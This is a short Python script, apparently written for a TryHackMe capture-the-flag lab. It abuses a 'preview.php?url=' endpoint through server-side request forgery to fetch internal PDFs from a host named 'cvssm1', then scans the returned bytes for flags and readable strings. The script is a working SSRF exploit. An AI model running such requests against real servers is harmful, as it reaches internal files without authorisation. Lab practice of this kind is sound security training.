import requests, urllib.parse, re

base = 'http://10.82.159.192/preview.php?url='

for name in ['dummy.pdf', 'lorem.pdf']:
    url = f'http://cvssm1/pdf/{name}'
    r = requests.get(base + urllib.parse.quote(url, safe=''), timeout=15)
    content = r.content

    print(f'\n=== {name} ({len(content)} bytes) ===')

    # Look for THM flags
    flags = re.findall(rb'THM\{[^}]+\}', content)
    if flags:
        print('FLAGS FOUND:', [f.decode() for f in flags])

    # All printable strings >= 8 chars
    strings = re.findall(rb'[ -~]{8,}', content)
    for s in strings:
        decoded = s.decode('latin-1')
        # Skip boring PDF internals
        if any(x in decoded for x in ['endobj', 'stream', 'BT', 'ET', 'Tf', 'Tm', 'Producer', 'Creator']):
            continue
        if decoded.strip():
            print(' ', decoded[:120])
